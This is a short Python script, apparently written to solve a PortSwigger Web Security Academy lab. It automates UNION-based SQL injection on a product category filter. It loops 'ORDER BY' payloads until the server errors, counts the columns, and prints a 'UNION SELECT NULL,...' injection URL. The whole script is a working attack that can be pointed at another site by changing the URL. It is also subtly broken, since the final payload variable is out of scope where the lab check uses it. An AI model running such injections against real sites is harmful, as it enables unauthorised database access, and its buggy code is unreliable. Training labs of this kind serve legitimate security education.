#created to be used with Portswigger WebSec Academy
#replace url with lab url similar to one seen below
import requests
#url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
url = 'https://aca91f781e2163b28052654c008f004d.web-security-academy.net/filter?category=Accessories'
sqli_row = ["'+ORDER+BY+",
            "'+UNION+SELECT+"]
used_attack_r = []
nulls = ""
valid_rows = 0
session = requests.Session()

try:
    r = session.get(url=url)
except Exception as e:
    print(e)
    exit()

def find_rows():
    global nulls,valid_rows,r
    if r.status_code == 200:
        for x in range(1,100):
            attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
            used_attack_r.append(attack_url)
            r = session.get(url=attack_url)
            if r.status_code == 500:
                valid_rows = x-1
                print("Valid number of rows is:",x-1)
                print(used_attack_r[x-2])
                for y in range(x-1):
                    nulls += "NULL,"
                break
def finish_it():
    final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls[:len(nulls)-1]+"--"
    print(final_attack)

def pass_lab_check():
    r = session.get(url=final_attack)
    if "Congratulations, you solved the lab!" in r.text:
        print("lab passed")

def main():
    find_rows()
    finish_it()
    pass_lab_check()

if __name__ == '__main__':
    main()
